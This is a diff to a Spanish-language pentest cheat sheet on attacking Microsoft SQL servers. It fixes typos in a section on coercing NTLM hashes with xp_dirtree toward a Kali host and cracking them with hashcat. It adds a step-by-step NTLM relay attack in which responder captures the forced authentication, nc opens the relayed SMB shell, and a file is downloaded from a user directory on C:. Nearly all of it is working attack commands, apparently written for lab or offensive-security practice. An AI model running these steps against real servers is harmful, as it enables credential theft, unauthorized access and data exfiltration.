@@ -225,8 +225,8 @@ Paso 1:
 ❯ responder -I tun0
 
 Paso 2:
-❯ sqsh -S ❮IP❯ -U 'Domain.corp\user' -P 'passwd'   # Ingresaar a la DB
-❯ xp_dirtree '\\❮IP_KALI❯\test'                    # Concultar un recurso inexistente en Kali  
+❯ sqsh -S ❮IP❯ -U 'Domain.corp\user' -P 'passwd'   # Ingresar a la DB
+❯ xp_dirtree '\\❮IP_KALI❯\test'                    # Consultar un recurso inexistente en Kali  
 ❯ go    # Ejecutar el comando 
 
 Paso 3:
@@ -240,14 +240,42 @@ Paso 1:
 
 Paso 2:
 ❯ xp_dirtree \\❮IP_KALI❯\smbFolder\test
-# Ejecutra dentro de mssqlclient para que el smbserver capture el hash 
+# Ejecutar dentro de mssqlclient para que el smbserver capture el hash 
 
 Paso 3:
 ❯ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt   # Crackear el hash obtenido 
 ```
 
+## 4. **NTLM Relay Attack** (o **NTLMv2 Relay Attack**) - Obtener una shell limitada
 
-## 4. ENUMERACIÓN DENTRO DEL MSSQL 
+```bash 
+Paso 1:
+❯ nxc smb IP           # Verificar que el server tenga (signing:False)
+
+Paso 2:
+❯ responder -I tun0    # Escuchar por la interfaz del tunel 	
+```
+
+```bash 
+Paso 3:
+# Dentro del server MSSQL forzaar la autenticación 
+❯ xp_dirtree \\IP_Kali\test    # Consultar un recurso en Kali que no exista
+```
+
+```bash 
+# Una vez que el reponder muestre lo siguiente:
+	[*] smb:///@10.1.210.11 [1] -> Started interactive SMB client shell via TCP on 127.0.0.1:11000
+
+Paso 4:
+❯ nc 127.0.0.1 11000    # Ingresar a la sesión obtenida
+	❯ use C$            # Utilizaar el disco C: 
+	❯ ls                # Listar el contenido 
+	❯ cd Users/user     # Ir al directorio de un usuario 
+	❯ get file.lnk      # Descargar un archivo del server a Kali   
+```
+
+
+## 5. ENUMERACIÓN DENTRO DEL MSSQL 
 
 ```bash
 # Dentro de impacket-mssqlclient
@@ -283,7 +311,7 @@ Paso 3:
 ```
 
 
-## 5. LINKED SERVERS — PIVOTAR A OTRO SERVIDOR SQL
+## 6. LINKED SERVERS — PIVOTAR A OTRO SERVIDOR SQL
 
 ```bash
 # Linked servers → este servidor tiene conexión a otro servidor MSSQL
